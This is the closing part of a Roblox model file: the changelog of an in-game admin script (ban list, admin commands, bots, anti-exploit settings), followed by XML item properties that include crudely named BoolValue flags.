	'!Instructions for enabling Http are at the top of the script with the Synced Ban List settings';
	'*Updated SBL Instructions and add screen shots to help';
	'*Place owners will be notified on-join if the SBL is on but Http is not enabled';
	'!Even if you do not intend to use the SBL, if you leave the default settings and enable Http,';
	'lots of known exploiters/exploit groups will be banned from your game making it safer!';
	'';
	'350:';
	'*Bug fixes and minor code upates';
	'';
	'349:';
	'*Made sure admins are excluded from bans';
	'';
	'348:';
	'*Fixed button spacing in the cameras gui';
	'+NetLag command';
	'';
	'347:';
	'*Bug fixes';
	'';
	'346:';
	'*Fixed some things with the freecam/unfreecam commands';
	'*RemoteEvent is alot safer now and less derp, more unremovable';
	'+Storage setting, default is game.ServerStorage';
	'*Tools MUST be in what ever the storage setting is set to, reccommended to move tools to ServerStorage as its more secure.';
	'*Trimmed changelog';
	'*Made the settings section of the script look nicer';
	'*Bug fixes';
	'';
	'345:';
	'*Bug fixes';
	'!All place owners should manually update if on versions <345, possible bug in auto update system.';
	'';
	'344:';
	'+Slippery command (and unslippery, can also use iceskate)';
	'*Bug fixes';
	'';
	'343:';
	'*Updates to the donor system (hopefully fixed the default cape not showing problem)';
	'*HOPEFULLY fixed a problem with the restoremap and the admin script';
	'';
	'342:';
	'+Added set.MakePluginEvent, plugin devs refer to the updated version of the Example Plugin for info';
	'-Removed set.ChatForPlugins (set.MakePluginEvent replaces it)';
	'';
	'341:';
	'*Possibly fixed a bug causing an error related to players. Fingers crossed';
	'';
	'340:';
	'*Fixed unfly (hopefully)';
	'';
	'339:';
	'*Updated crash';
	'';
	'338:';
	'+CustomPlayerList, very simple, not done at all, plan to finish in future';
	'+Can now do things like :kill all,-kohl to kill all except kohl, suggested by GloriedRage';
	'*Bug fixes';
	'*Completely new GetPlayers function, less code, more efficient';
	'*Custom cape uses Texture ID again due to bugs';
	'';
	'337:';
	'*Bug fixes';
	'';
	'336:';
	'-AntiExploit setting';
	'*Split things that were under the AntiExploit setting into their own settings';
	'+ExclusionList table, lets you set people to exclude from the anti exploit and bans';
	'';
	'335:';
	'*Added pathfinding service stuff to the bots for when the service is out of testing';
	'';
	'334:';
	'*Bots now jump when chasing someone';
	'*Fixed some bot related bugs';
	'';
	'333:';
	'+AntiLeak (Idk if it will work and if it does how well, just changes the archivable setting)';
	'';
	'332:';
	'*Critical Bug Fix, thank you snakeeey for reporting.';
	'';
	'331:';
	'*Temp Critical Bug Fix';
	'';
	'330:';
	'*Minor updates';

}]]></ProtectedString>
				</Properties>
			</Item>
			<Item class="BoolValue" referent="RBX429DE4BD43DB4667BD846E84A94DE629">
				<Properties>
					<string name="Name">FUCKOFFALREADY</string>
					<bool name="Value">true</bool>
				</Properties>
			</Item>
		</Item>
		<Item class="IntValue" referent="RBX3A54A15CBC754AE58A1862C2DE8C0DA4">
			<Properties>
				<string name="Name">Version</string>
				<int name="Value">1</int>
			</Properties>
		</Item>
		<Item class="BoolValue" referent="RBXC94DDD560C0F472F92CECB18B8E83F24">
			<Properties>
				<string name="Name">FUCKOFFALREADY</string>
				<bool name="Value">true</bool>
			</Properties>
		</Item>
	</Item>
</roblox>